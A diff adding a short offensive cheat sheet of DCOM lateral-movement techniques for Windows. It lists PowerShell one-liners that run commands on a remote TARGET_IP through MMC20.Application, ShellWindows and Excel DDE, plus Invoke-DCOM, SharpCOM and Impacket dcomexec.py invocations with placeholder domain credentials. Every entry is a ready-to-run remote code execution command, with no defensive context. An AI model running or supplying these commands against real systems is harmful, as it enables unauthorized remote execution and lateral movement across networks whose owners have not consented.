@@ -1,0 +1,28 @@
+
+-------using MMC20 Application
+
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET_IP"))
+$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\output.txt","7")
+
+-------shellwindows
+
+$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET_IP"))
+$item = $com.Item()
+$item.Document.Application.ShellExecute("cmd.exe","/c whoami > C:\output.txt","C:\Windows\System32",$null,0)
+
+-------excel.Application
+
+$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","TARGET_IP"))
+$excel.DisplayAlerts = $false
+$excel.DDEInitiate("cmd", "/c whoami > C:\output.txt")
+
+------powershell
+Invoke-DCOM -ComputerName TARGET_IP -Method MMC20.Application -Command "cmd /c whoami"
+
+
+-----SharpCOM
+SharpCOM.exe TARGET_IP MMC20.Application "cmd /c whoami"
+
+
+-----dcomexec.py
+dcomexec.py DOMAIN/USER:PASSWORD@TARGET_IP
